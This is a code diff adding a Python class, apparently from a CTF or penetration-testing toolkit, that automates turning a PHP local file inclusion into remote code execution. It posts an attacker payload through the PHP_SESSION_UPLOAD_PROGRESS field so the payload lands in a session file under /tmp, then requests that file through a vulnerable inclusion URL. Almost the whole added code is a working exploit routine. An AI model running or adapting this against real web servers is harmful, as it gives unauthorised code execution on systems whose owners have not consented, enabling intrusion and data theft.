@@ -1,5 +1,28 @@
 from bs4 import BeautifulSoup
+import requests as req
 import base64, re
+
+
+class UploadSessionLFI2RCE:
+    def __init__(self, url: str, lfi_urlformat: str, cookiename: str, payload: str):
+        self.url = url
+        self.lfi_urlformat = lfi_urlformat
+        self.cookiename = cookiename
+        self.payload = payload
+
+    def upload_session(self):
+        res = req.post(self.url, 
+            cookies = {'PHPSESSID': self.cookiename}, 
+            data = {'PHP_SESSION_UPLOAD_PROGRESS': self.payload}, 
+            files = {'file': 'a' * 0x10000}
+        )
+        return res
+
+    def trigger_lfi(self):
+        res = req.get(
+            self.lfi_urlformat.format(f'/tmp/sess_{self.cookiename}')
+        )
+        return res
 
 
 def phpinfo2phpvar(html: str):
